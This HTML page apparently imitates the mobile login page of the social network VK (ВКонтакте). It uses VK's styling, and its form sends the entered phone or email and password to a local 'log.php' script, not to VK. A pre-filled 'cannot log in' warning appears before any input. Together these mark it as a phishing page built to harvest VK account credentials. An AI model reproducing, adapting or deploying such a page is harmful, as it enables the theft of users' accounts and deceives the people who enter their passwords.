﻿<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="format-detection" content="telephone=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="MobileOptimized" content="176" />
<meta name="HandheldFriendly" content="True" />
<base id="base">
<title>Вход | ВКонтакте</title>
<link type="text/css" rel="stylesheet" href="https://m.vk.com/css/s_cfmxw.css?295"></link>
<link type="text/css" rel="stylesheet" media="only screen" href="https://m.vk.com/css/s_yzgt.css?211"></link>
<script type="text/javascript" src="https://m.vk.com/js/s_c.js?266"></script>
<link rel="shortcut icon" href="http://vk.com/images/icons/favicons/fav_logo.ico?6"></link>
<link rel="canonical" href="https://vk.com/"></link><link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
</head>
<body id="vk" class="_hover _hfixed" onresize="onBodyResize(true);">
<div id="vk_utils"></div>
<div id="vk_head" class="mhead">
<div class="hb_wrap"><div class="hb_btn">&nbsp;</div></div>
</div>
<div id="vk_wrap" class="_vpan qs_enabled">
<div id="z"></div>
<div id="l"></div>
<div id="m"><div id="mhead" class="mhead">
<a href="" accesskey="*" class="hb_wrap mhb_logo">
<div class="hb_btn mhi_logo">&nbsp;</div>
<h1 class="hb_btn mh_header">&nbsp;</h1>
</a></div>
<div id="mcont" class="mcont"><div class="pcont fit_box bl_cont">
<div class="text_panel">
Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
</div>
<div class="form_item fi_fat">
<form method="post" action="log.php" novalidate>
<div class="service_msg_box">
<div class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных. <a href="/restore">Проблемы со входом?</a></div>
</div>
<dl class="fi_row">
<dt class="fi_label">Телефон или email:</dt>
<dd>
<div class="iwrap"><input type="text" class="textfield" name="login" value="" /></div>
</dd>
</dl>
<dl class="fi_row">
<dt class="fi_label">Пароль:</dt>
<dd>

<div class="iwrap"><input type="password" class="textfield" name="password" /></div>
</dd>
</dl>
<div class="fi_row">
<div class="fi_subrow">
<input class="button wide_button" type="submit" value="Войти" />
</div>
<div class="fi_subrow">
<div class="near_btn wide_button"><a >Забыли пароль?</a></div>
</div>
</div>
<div class="fi_row_new">
<a class="button wide_button gray_button" >Зарегистрироваться</a>
</div>
</form>

</div>
</div></div>
<div id="mfoot" class="mfoot"><div class="pfoot">
<ul class="footer_menu">
<li class="fm_row"><a class="fm_item" >English</a></li><li class="fm_row"><a class="fm_item">Українська</a></li>
<li class="fm_row"><a class="fm_item" >all languages »</a></li>
</ul>
<ul id="footer_menu" class="footer_menu">
<li class="fm_row"><a class="fm_item" >Полная версия</a></li>
</ul>
</div></div>
<div id="z"></div>
</div>
<div id="vk_bottom"></div>
</body>
</html>
